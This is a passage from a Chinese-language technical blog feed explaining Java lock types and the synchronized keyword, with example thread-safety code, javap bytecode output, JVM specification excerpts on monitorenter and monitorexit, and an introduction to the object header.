<p><img src="https://huhansi.github.io/images/2020-03-10-leguan-beiguan.png" alt="乐观锁/悲观锁图示"></p>
<p>根据上面的图示，可以得出：</p>
<ul>
<li>悲观锁适合写操作比较多的场景，先加锁可以保证写操作时数据正确。</li>
<li>乐观锁适合读操作多的场景，不加锁的特点能够使其读操作的性能大幅提升</li>
</ul>
<p>CAS算法可参考<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-05-Java-CAS-解析/#more">CAS算法解析</a></p>
<h3 id="分段锁"><a href="#分段锁" class="headerlink" title="分段锁"></a>分段锁</h3><p>分段锁是一种锁的设计，并不是一种具体的锁。是在JDK 1.7之中，ConcurrentHashMap采用的一种锁。ConcurrentHashMap就是通过它来实现并发的高效操作。</p>
<p>具体可参考<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-07-ConCurrentHashMap在Java1.7和1.8中的区别/">ConcurrentHashMap 在 Java 1.7 和 Java 1.8 中的区别</a></p>
<h3 id="无锁-偏向锁-轻量级锁-重量级锁"><a href="#无锁-偏向锁-轻量级锁-重量级锁" class="headerlink" title="无锁/偏向锁/轻量级锁/重量级锁"></a>无锁/偏向锁/轻量级锁/重量级锁</h3><h4 id="无锁"><a href="#无锁" class="headerlink" title="无锁"></a>无锁</h4><p>无锁，即没有对资源进行锁定，所有的线程都可以访问并修改同一个资源，但同时只能有一个线程修改成功。</p>
<p>无锁的特点就是修改操作在循环内进行，线程会不断地尝试比较待修改的值是不是和预期的值一致，是的话就修改成功，并退出，否则，继续循环尝试。</p>
<h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h4><p>偏向锁指的是同一段代码一直被同一个线程所访问，那么该线程后续再来访问的话，就会自动获取锁，减轻锁获取的代价。</p>
<p>大多数情况下，锁总是由同一线程多次获得，不存在多线程竞争，所以出现了偏向锁。其目标就是在只有一个线程执行同步代码块时能够提高性能。</p>
<p>偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待全局安全点（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态。撤销偏向锁后恢复到无锁或轻量级锁（升级）的状态。</p>
<p>偏向锁在JDK 1.6及以后的JVM里是默认启用的。可以通过JVM参数关闭偏向锁：<strong>-XX:-UseBiasedLocking=false</strong>，关闭之后程序默认会进入轻量级锁状态。</p>
<h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h4><p>轻量级锁是指当锁是偏向锁的时候，被另外的线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞，从而提高性能。</p>
<h4 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h4><p>重量级锁是将除了拥有锁的线程以外的线程都阻塞。</p>
<p>这四种状态时针对synchronized关键字的，在Java1.5中引入了锁升级的机制来实现高效地synchronized。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-suoshengji.png" alt="锁升级顺序"></p>
<h3 id="自旋锁-适应性自旋锁"><a href="#自旋锁-适应性自旋锁" class="headerlink" title="自旋锁/适应性自旋锁"></a>自旋锁/适应性自旋锁</h3><h4 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h4><p>自旋锁的产生基于两个前提：</p>
<ul>
<li>有些时候线程切换所消耗的CPU周期比用户代码执行时间还长</li>
<li>大部分场景下，锁定资源的时间很短，在短时间内频繁地切换上下文，很可能得不偿失</li>
</ul>
<p>在这种前提下，就有了自旋锁。如果当前线程T去获取某个锁的时候，发现该锁已经被另外一个线程S所占有，此时它不阻塞自己，而是不放弃CPU的所有权，定期的去轮询线程S是否已经释放锁了，如果已经释放了，那么线程T就可以直接获取同步资源的锁了，直接略过线程休眠和唤起的开销。</p>
<p>自旋锁也存在缺点。如果线程S长时间没有释放锁的时候，线程T就会长时间占用CPU时间，白白浪费计算资源。所以，应该给自旋锁自旋时间加上上限，如果超过了一定次数，则挂起线程T。可以使用参数（<strong>-XX:PreBlockSpin</strong>）配置，默认是10次。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-spinlock.png" alt="自旋锁示例"></p>
<h4 id="适应性自旋锁"><a href="#适应性自旋锁" class="headerlink" title="适应性自旋锁"></a>适应性自旋锁</h4><p>适应性自旋锁意味着锁自旋的时间不再收参数控制，而是根据线程上一次获取到锁所耗费的自旋时间及锁的拥有者状态决定。</p>
<p>如果在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持有锁的线程正在运行中，那么虚拟机就会认为这次自旋也是很有可能再次成功，进而它将允许自旋等待持续相对更长的时间。如果对于某个锁，自旋很少成功获得过，那在以后尝试获取这个锁时将可能省略掉自旋过程，直接阻塞线程，避免浪费处理器资源。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>下图是根据参考资料[1]稍微修改而来的脑图。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-locks.png.png" alt="Java中的锁"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[1].<a href="https://tech.meituan.com/2018/11/15/java-lock.html" target="_blank" rel="noopener">不可不说的Java“锁”</a></p>
<p>[2].<a href="https://www.cnblogs.com/qifengshi/p/6831055.html" target="_blank" rel="noopener">Java中的锁分类</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>synchronized关键字解析</title>
    <url>/2020/03/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-10-%E5%A4%9A%E7%BA%BF%E7%A8%8B-02-synchronized%E5%85%B3%E9%94%AE%E5%AD%97%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h2 id="synchronized关键字解析"><a href="#synchronized关键字解析" class="headerlink" title="synchronized关键字解析"></a>synchronized关键字解析</h2><h2 id="synchronized关键字的作用"><a href="#synchronized关键字的作用" class="headerlink" title="synchronized关键字的作用"></a>synchronized关键字的作用</h2><p>synchronized是Java在语言层面提供的一个用于线程并发同步的关键字。它可以应用在三个方面。</p>
<ul>
<li>修饰实例方法：作用于当前实例对象，对当前实例对象加锁，进入同步代码前需要获取当前实例的锁。</li>
<li>修饰静态方法：作用于当前类对象（XXX.class对象），进入同步代码前需要获取当前类对象的锁。</li>
<li>修饰代码块：作用域指定的对象，进入代码前需要获取指定对象的锁。</li>
</ul>
<h3 id="修饰实例方法"><a href="#修饰实例方法" class="headerlink" title="修饰实例方法"></a>修饰实例方法</h3><p>如下例程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// i++ 不具备原子性，需要锁来保护</span></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SynchronizedTest st = <span class="keyword">new</span> SynchronizedTest();</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类SynchronizedTest的静态变量i是共享资源。对其的操作<strong>i++</strong>并不具有原子性，操作分三步：1. 取i原值；2. 加一；3. 存入新值。如果两个线程同时取了i值，同时加1，然后先后存入，就会导致i实际上只加了一次，存在线程安全问题。因此用synchronized关键字对addOne方法进行了修饰。确保同一时间只能有一个线程对i进行自增操作。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-200000.png" alt="加上synchronized关键字得到正确的结果"></p>
<p>注意：synchronized关键字修饰的是实例方法，这种场景下，锁住的是当前对象，也就是<strong>this</strong>。此时，其他线程无法在访问该对象的其他synchronized方法。</p>
<p>因此，下面这种场景下，是无法得到正确的值的。因为，虽然都是用synchronized修饰了addOne方法，但是他们锁住的是两个不同的SynchronizedTest对象。造成i结果互相干扰，每次执行结果不定。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 两个不同的实例对象，锁不住</span></span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修饰静态方法"><a href="#修饰静态方法" class="headerlink" title="修饰静态方法"></a>修饰静态方法</h3><p>静态方法是属于类而不是属于实例的。因此，synchronized修饰的静态方法锁定的是这个类对象。因此，上个章节的问题，就可以通过在方法addOne前面加上<strong>static</strong>修饰符解决。无论new出来多少个Synchronized对象，它的类对象始终只有一个，就不会存在线程安全的问题了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 这里加上static修饰符</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果当前线程T正在访问同步静态方法，那么其他的线程是否可以访问，这个类的非静态同步方法呢？答案是肯定的。因为，静态同步方法锁住的是类对象(XXX.class)，而非静态同步方法锁住的是当前对象，是两个不同的对象，二者互不干涉。</p>
<h3 id="修饰代码块"><a href="#修饰代码块" class="headerlink" title="修饰代码块"></a>修饰代码块</h3><p>Java允许对一小块代码使用synchronized关键字。此时可以使用任何对象充当被锁的对象。</p>
<h4 id="使用当前实例对象充当锁"><a href="#使用当前实例对象充当锁" class="headerlink" title="使用当前实例对象充当锁"></a>使用当前实例对象充当锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SynchronizedTest st = <span class="keyword">new</span> SynchronizedTest();</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用类对象充当锁"><a href="#使用类对象充当锁" class="headerlink" title="使用类对象充当锁"></a>使用类对象充当锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span>(SynchronizedTest<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面两段代码块的运行结果是一致的，都是20000.</p>
<h2 id="synchronized关键字的原理"><a href="#synchronized关键字的原理" class="headerlink" title="synchronized关键字的原理"></a>synchronized关键字的原理</h2><p>我们先把synchronized关键字修饰的相关代码反编译一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Start "</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">staticMethod</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"静态同步方法开始"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(<span class="string">"静态同步方法结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法开始"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法2开始"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法2结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SynchronizedTest synDemo = <span class="keyword">new</span> SynchronizedTest();</span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               synDemo.method();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                synDemo.method2();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先将上述源文件编译为.class文件，执行命令 <strong>javac SynchronizedTest.java</strong>即可。获取到SynchronizedTest.class字节码文件之后，再执行<strong>javap -v SynchronizedTest</strong>命令，反编译字节码文件，得到如下内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span></span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags:</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">2</span>, args_size=<span class="number">1</span></span><br><span class="line">         0: getstatic     #20                 // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">         3: ldc           #26                 // String Start</span><br><span class="line">         5: invokevirtual #28                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">         <span class="number">8</span>: aload_0</span><br><span class="line">         <span class="number">9</span>: dup</span><br><span class="line">        <span class="number">10</span>: astore_1</span><br><span class="line">        <span class="number">11</span>: monitorenter</span><br><span class="line">        12: getstatic     #10                 // Field i:I</span><br><span class="line">        <span class="number">15</span>: iconst_1</span><br><span class="line">        <span class="number">16</span>: iadd</span><br><span class="line">        17: putstatic     #10                 // Field i:I</span><br><span class="line">        <span class="number">20</span>: aload_1</span><br><span class="line">        <span class="number">21</span>: monitorexit</span><br><span class="line">        <span class="number">22</span>: goto          <span class="number">28</span></span><br><span class="line">        <span class="number">25</span>: aload_1</span><br><span class="line">        <span class="number">26</span>: monitorexit</span><br><span class="line">        <span class="number">27</span>: athrow</span><br><span class="line">        <span class="number">28</span>: <span class="keyword">return</span>  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">staticMethod</span><span class="params">()</span> <span class="keyword">throws</span> java.lang.InterruptedException</span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC, ACC_SYNCHRONIZED</span><br><span class="line">    Exceptions:</span><br><span class="line">      <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> <span class="keyword">throws</span> java.lang.InterruptedException</span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_SYNCHRONIZED</span><br><span class="line">    Exceptions:</span><br><span class="line">      <span class="keyword">throws</span> java.lang.InterruptedException</span><br></pre></td></tr></table></figure>

<p>从上面反编译的内容可以发现，同步方法都会有一个ACC_SYNCHRONIZED的flag.而synchronized修饰的代码块反编译出来的指令中多了两条monitorenter和monitorexit指令。它们作用是进入和退出管程，Java虚拟机就是靠管程对象，实现同步的。</p>
<p>使用java虚拟机规范中的一句话来解释可能更加浅显易懂</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Synchronization in the Java Virtual Machine is implemented by monitor entry and exit, either explicitly (by use of the monitorenter and monitorexit instructions) or implicitly (by the method invocation and return instructions). For code written in the Java programming language, perhaps the most common form of synchronization is the synchronized method. A synchronized method is not normally implemented using monitorenter and monitorexit. Rather, it is simply distinguished in the run-time constant pool by the ACC_SYNCHRONIZED flag, which is checked by the method invocation instructions (§2.11.10).</span><br></pre></td></tr></table></figure>

<p>大意就是</p>
<ul>
<li>在Java虚拟机中，同步的实现是通过管程的进入和退出实现的。要么显式地通过monitorenter和monitorexit指令实现，要么隐式地通过方法调用和返回指令实现。</li>
<li>对于Java代码来说，最常用的同步实现就是同步方法。其中同步代码块是通过使用monitorenter和monitorexit实现的，而同步方法确实使用ACC_SYNCHRONIZED标记符隐式地实现，原理是通过方法调用指令检查该方法在常量池中是否包含ACC_SYNCHRONIZED标记符。</li>
</ul>
<p>如果有设置该值，则需要先获取管程的锁，然后开始执行方法，方法执行之后在释放管程的锁，这时候如果其他线程来请求执行该方法，会因无法获得管程锁而被阻塞住。值得注意的是，如果在方法执行过程中，发生了异常，并且方法内部并没有处理该异常，那么在异常跑到方法外面之后，管程的锁将会被<strong>自动释放</strong>。</p>
<h3 id="monitorenter"><a href="#monitorenter" class="headerlink" title="monitorenter"></a>monitorenter</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Each object is associated with a monitor. A monitor is locked if and only if it has an owner. The thread that executes monitorenter attempts to gain ownership of the monitor associated with objectref, as follows:</span><br><span class="line">	If the entry count of the monitor associated with objectref is zero, the thread enters the monitor and sets its entry count to one. The thread is then the owner of the monitor.</span><br><span class="line"></span><br><span class="line">	If the thread already owns the monitor associated with objectref, it reenters the monitor, incrementing its entry count.</span><br><span class="line"></span><br><span class="line">	If another thread already owns the monitor associated with objectref, the thread blocks until the monitor’s entry count is zero, then tries again to gain ownership.</span><br></pre></td></tr></table></figure>

<p>大意是：每个对象都关联了一个管程。一个管程如果已经拥有了一个所有者，那么就被视为锁住了。以下是三种线程执行指令monitorenter来获取对象的管程拥有权的场景及其结果。</p>
<ul>
<li>对象关联的管程引用计数是0，那么当前线程获取该管程的所有权，并将计数设置为1</li>
<li>如果当前线程已经是该管程的所有者，那么重新进入管程，并将计数自增1</li>
<li>如果其他线程已经拥有了某个对象的管程所有权（即管程引用计数不唯一，并且所有者为其他线程）。当前线程再去获取的话，就会阻塞，直到该管程的引用计数为0才可能获取到所有权。</li>
</ul>
<h3 id="monitorexit"><a href="#monitorexit" class="headerlink" title="monitorexit"></a>monitorexit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The thread that executes monitorexit must be the owner of the monitor associated with the instance referenced by objectref.</span><br><span class="line"></span><br><span class="line">The thread decrements the entry count of the monitor associated with objectref. If as a result the value of the entry count is zero, the thread exits the monitor and is no longer its owner. Other threads that are blocking to enter the monitor are allowed to attempt to do so.</span><br></pre></td></tr></table></figure>

<p>大意是：只有管程的所有者才可以执行monitorexit指令。当线程减少管程的引用计数直至0时，此线程就退出了管程，也就不再是该管程的所有者了。此时，其他被阻塞的线程就可以尝试着去获取这个管程了。</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitorenter.png" alt="monitorenter流程"></p>
<h2 id="Java对象头"><a href="#Java对象头" class="headerlink" title="Java对象头"></a>Java对象头</h2><p>在理解管程之前，需要了解一下Java的对象头相关知识。</p>
<p>Java对象保存在内存中，主要以以下三部分组成：</p>
<ul>
<li>对象头</li>
<li>实例数据</li>
<li>对齐填充数据</li>
</ul>
<h3 id="对象头"><a href="#对象头" class="headerlink" title="对象头"></a>对象头</h3><p>对象头由以下三个部分组成：</p>
<ul>
<li>Mark Word：用于存储对象自身运行时的数据，它是实现轻量级锁和偏向锁的关键</li>
<li>类型指针：是对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例</li>
<li>数组长度（如果是数组对象的话）</li>
</ul>
<h4 id="Mark-Word"><a href="#Mark-Word" class="headerlink" title="Mark Word"></a>Mark Word</h4><table>
<thead>
<tr>
<th>虚拟机位数</th>
<th>头对象结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>32/64位</td>
<td>Mark Word</td>
<td>存储对象自身的运行时数据，如hash码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等。</td>
</tr>
</tbody></table>
